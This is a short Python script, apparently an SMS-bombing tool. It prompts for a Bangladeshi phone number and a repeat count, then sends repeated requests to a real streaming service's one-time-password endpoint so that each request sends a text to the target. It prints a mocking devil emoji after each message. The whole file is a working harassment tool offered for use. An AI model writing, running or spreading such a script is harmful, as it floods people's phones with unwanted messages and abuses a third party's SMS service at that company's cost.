print ("welcome to BFHB")

import requests

number=str(input(" Enter The Number👉 : "))

amount=int(input(" Enter The Amount👉 : "))

api="https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"

for i in range(amount):
	
	requests.get(api)
	
	print(str(i+1)+" ✉️➡️BDHB SMS Sent😈")
